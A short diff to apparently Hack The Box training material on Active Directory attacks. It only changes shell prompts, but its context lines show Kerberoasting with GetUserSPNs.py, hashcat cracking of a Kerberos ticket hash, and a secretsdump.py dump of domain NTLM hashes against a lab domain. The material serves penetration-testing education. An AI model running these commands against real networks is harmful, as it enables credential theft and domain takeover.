@@ -41,7 +41,7 @@ VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'acmetesting/LEGIT
 ```
 
 ``` shell-session
-[!bash!]$ proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
+ndefstathiou@htb[/htb]$ proxychains GetUserSPNs.py -dc-ip 172.16.8.3 INLANEFREIGHT.LOCAL/mssqladm -request-user ttimmons
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation
@@ -61,7 +61,7 @@ $krb5tgs$23$*ttimmons$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/ttimmons*$6c391145
 ```
 
 ``` shell-session
-[!bash!]$ hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
+ndefstathiou@htb[/htb]$ hashcat -m 13100 ttimmons_tgs /usr/share/wordlists/rockyou.txt
 
 hashcat (v6.1.1) starting...
 
@@ -107,7 +107,7 @@ VERBOSE: [Add-DomainGroupMember] Adding member 'ttimmons' to group 'S-1-5-21-281
 ```
 
 ``` shell-session
-[!bash!]$ proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
+ndefstathiou@htb[/htb]$ proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
 
 ProxyChains-3.1 (http://proxychains.sf.net)
 Impacket v0.9.24.dev1+20210922.102044.c7bc76f8 - Copyright 2021 SecureAuth Corporation
